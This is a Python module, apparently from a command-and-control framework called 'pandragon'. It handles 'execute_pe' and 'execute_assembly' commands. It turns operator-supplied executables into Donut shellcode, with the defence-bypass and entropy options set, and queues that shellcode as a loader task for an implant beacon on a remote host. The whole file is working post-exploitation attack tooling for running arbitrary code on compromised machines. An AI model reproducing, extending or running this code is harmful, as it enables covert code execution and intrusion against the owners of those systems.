#!/usr/bin/env python3
"""
Server-side Execute Assembly / PE via Donut

Handles the 'execute_assembly' and 'execute_pe' commands:
1. Receives PE file from operator
2. Converts to PIC shellcode via Donut
3. Sends shellcode_loader BOF with shellcode as argument
"""

import base64
import logging
import tempfile
import os
import struct
from typing import Optional

logger = logging.getLogger('pandragon.execute_pe')

try:
    import donut
    DONUT_AVAILABLE = True
except ImportError:
    DONUT_AVAILABLE = False


async def handle_execute_pe(
    ctx,
    beacon_id: str,
    pe_data_b64: str,
    pe_filename: str,
    cls: Optional[str] = None,
    method: Optional[str] = None,
    params: Optional[str] = None,
    runtime: str = "v4.0.30319",
    arch: int = 2,
    bypass: int = 3
) -> dict:
    """
    Execute a PE file via Donut shellcode conversion.
    
    Returns dict with success status and message.
    """
    if not DONUT_AVAILABLE:
        return {'success': False, 'error': 'donut-shellcode not installed on server'}
    
    if not pe_data_b64:
        return {'success': False, 'error': 'No PE data provided'}
    
    try:
        # Decode PE from base64
        pe_bytes = base64.b64decode(pe_data_b64)
        
        # Write to temp file for Donut
        with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
            f.write(pe_bytes)
            temp_path = f.name
        
        try:
            # Generate shellcode via Donut
            import donut
            shellcode = donut.create(
                file=temp_path,
                cls=cls,
                method=method,
                params=params,
                runtime=runtime,
                arch=arch,
                bypass=bypass,
                compress=1,
                entropy=1,
            )
            
            if not shellcode:
                return {'success': False, 'error': 'Donut returned empty shellcode'}
            
            logger.info(f"Generated {len(shellcode)} bytes shellcode from {pe_filename}")
            
            # Encode shellcode for transport (base32 is space-efficient for JSON)
            shellcode_b32 = base64.b32encode(shellcode).decode('ascii')
            
            # Build BOF arguments: encoding(1) + len(4) + shellcode
            # encoding=2 means "raw" (we pre-decoded base32 on server)
            bof_args = struct.pack('<BI', 2, len(shellcode)) + shellcode
            
            # Queue shellcode_loader BOF execution
            from protocol.constants import S2BOpcode
            task_id = await ctx.task_queue.add_task(
                beacon_id=beacon_id,
                opcode=S2BOpcode.BOF_EXEC,
                payload=bof_args,
                operator_id=None,
                description=f"execute_pe: {pe_filename} ({len(shellcode)} bytes shellcode)"
            )
            
            return {
                'success': True,
                'task_id': task_id,
                'shellcode_size': len(shellcode),
                'message': f'Shellcode loader BOF queued ({len(shellcode)} bytes)'
            }
            
        finally:
            try:
                os.unlink(temp_path)
            except:
                pass
                
    except Exception as e:
        logger.exception(f"execute_pe failed: {e}")
        return {'success': False, 'error': str(e)}


async def handle_execute_assembly(
    ctx,
    beacon_id: str,
    assembly_b64: str,
    assembly_name: str,
    cls: str,
    method: str = "Main",
    params: Optional[str] = None,
    runtime: str = "v4.0.30319"
) -> dict:
    """
    Execute a .NET assembly via Donut.
    This is a convenience wrapper around execute_pe for .NET assemblies.
    """
    return await handle_execute_pe(
        ctx=ctx,
        beacon_id=beacon_id,
        pe_data_b64=assembly_b64,
        pe_filename=assembly_name,
        cls=cls,
        method=method,
        params=params,
        runtime=runtime,
        arch=2,
        bypass=3
    )